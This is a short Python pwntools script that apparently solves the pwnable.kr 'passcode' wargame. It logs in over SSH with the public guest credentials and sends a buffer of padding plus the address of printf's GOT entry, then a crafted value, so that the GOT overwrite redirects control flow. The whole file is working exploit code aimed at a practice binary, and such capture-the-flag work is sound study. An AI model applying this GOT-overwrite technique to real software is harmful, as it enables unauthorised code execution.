from pwn import *

printf = 0x0804a004

s=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)
p=s.process('./passcode')
#p = process('./passcode')

print p.recvuntil(':')

payload = "A"*96+pack(printf)

p.sendline(payload)

print p.recvline()

print p.recvuntil(':')

p.sendline('134514147')


print p.recvlines(2)
